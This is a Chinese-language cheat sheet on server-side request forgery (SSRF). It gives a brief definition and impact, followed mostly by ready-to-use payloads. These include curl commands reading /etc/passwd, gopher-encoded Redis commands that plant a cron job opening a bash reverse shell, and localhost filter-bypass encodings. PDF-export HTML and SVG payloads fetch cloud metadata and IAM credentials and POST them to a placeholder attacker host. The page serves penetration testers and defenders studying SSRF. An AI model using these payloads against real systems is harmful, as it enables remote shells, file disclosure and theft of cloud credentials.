SSRF
========================================

简介
----------------------------------------
服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。

漏洞危害
----------------------------------------
+ SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。
+ 大部分情况都是GET型SSRF漏洞，仅能探测存活，扫描端口，内网域名探测等，危害十分有限。

利用方式
----------------------------------------
	|ssrf1|
	
SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。

以curl为例, 可以使用dict protocol操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：

:: 

	# 利用file协议查看文件
	curl -v 'file:///etc/passwd'

	# 利用dict探测端口
	curl -v 'dict://127.0.0.1:22'
	curl -v 'dict://127.0.0.1:6379/info'

	# 利用gopher协议反弹shell
	curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'

	# 利用file协议任意文件读取
	curl -v 'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'

	# 利用dict协议查看端口
	curl -v 'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'

	# 利用gopher协议反弹shell
	curl -v 'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'

相关危险函数
----------------------------------------
SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 ``file_get_contents()`` / ``fsockopen()`` / ``curl_exec()`` 等。

过滤绕过
----------------------------------------

常规绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

	IP切换禁止和省略：
	http://localhost
	http://127.1
	[http://127.0.0.0](http://127.0.0.0/)
	http://2130706433
	http://0177.1
	http://0x7f.1
	
	8进制格式：0300.0250.0.1
	16进制格式：0xC0.0xA8.0.1
	10进制整数格式：3232235521
	16进制整数格式：0xC0A80001

	http://127.000.000.1
	http://localtest.me
	
	利用IPV6：
	http://[::1]
	http://[::]
	http://[0:0:0:0:0:ffff:127.0.0.1]

	利用泛域名解析
	192.168.0.1.nip.io
	192.168.0.1.sslip.io
	
	http://0.0.0.0
	http://127.1.1.1
	%31%32%37%2E%30%2E%30%2E%31

其它
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 规则漏洞： ``http://www.baidu.com@192.168.0.1/`` 
+ 跳转： ``http://httpbin.org/redirect-to?url=http://192.168.0.1``

非HTTP协议
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ``gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a``
+ ``file:///path/to/file`` , ``file:///d:/1.txt``


文件（PDF）导出功能的SSRF
----------------------------------------

测试
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

	首先需要测试是否被渲染：
	
	<body>
	<h1>Congratulations!</h1>
	<img src=''/><h1>Big Apostrophe</h1><h5>Little Apostrophe</h5>'></img>
	</body>

	<body>
	<h1>Congratulations!</h1>
	<img src=""/><h1>Big Quotation Mark</h1><h5>Little Quotation Mark</h5>"></img>
	</body>

::

	利用img标签：
	<body>
	<h1>Congratulations!</h1>
	<img src="https://127.0.0.1"></img>
	</body>

::

	利用script标签：
	<body>
	<h1>Proof that you Signed Your Life Away</h1>
	<img src=""><body id="body">  <script>jsImg = new Image();jsImg.src="https://xxx.xxx.xxx/1.png";document.getElementById("body").appendChild(jsImg);</script></body>"></img>
	</body>

::

	利用onerror事件：
	<body>
	<h1>Proof that you Signed Your Life Away</h1>
	<img src=""><img src="a" onerror='var jsImg = new Image; jsImg.src="https://{{YOUR_BURP_COLLAB_URL_HERE}}";'></img>"></img>
	</body>

::

	利用iframe标签：
	<body>
	<h1>Proof that you Signed Your Life Away</h1>
	<img src=""><iframe src="http://metadata.tencentyun.com/latest/meta-data"></iframe>"></img>
	</body>

::

	利用meta refresh:
	<meta http-equiv="refresh" content="0;url=http://metadata.tencentyun.com/latest/meta-data" />

::

	利用SVG标签：
	<svg width="100%" height="100%" viewBox="0 0 100 100" 
	xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
	<image xlink:href="https://www.baidu.com/img/flexible/logo/pc/result@2.png" height="20" width="20" onload="fetch('http://metadata.tencentyun.com/latest/meta-data/').then(function (response) {
	response.text().then(function(text) {
	var params = text;
	var http = new XMLHttpRequest();
	var url = 'https://xxxxxxxxxxxxxxxx/';
	http.open('POST', url, true);
	http.send(params);
	})});" />
	</svg>


云服务器
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

	泄漏 IAM 角色名称:

	<body>
	<h1>Proof that you Signed Your Life Away</h1>
	<img src=""><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials></iframe>
	"></img>
	</body>

::

	泄漏安全凭据:

	<body>
	<h1>Proof that you Signed Your Life Away</h1>
	<img src=""><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/{{SECURITY_ROLE_ID}}></iframe>
	"></img>
	</body>



前端传入HTML元素到后端
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ payload: ``<iframe src="http://ssrf.jd.local/">``
+ payload: ``<meta http-equiv="refresh" content="0;url=http://ssrf.jd.local/"/>``

关键参数
---------------------------------------
- 图片检索功能
	+ url参数
- 关键参数
	+ ``share,wap,url,link,src,source,target,u,display,sourceURl,imageURL,domain``


.. |ssrf1| image:: ../../images/ssrf1.jpg
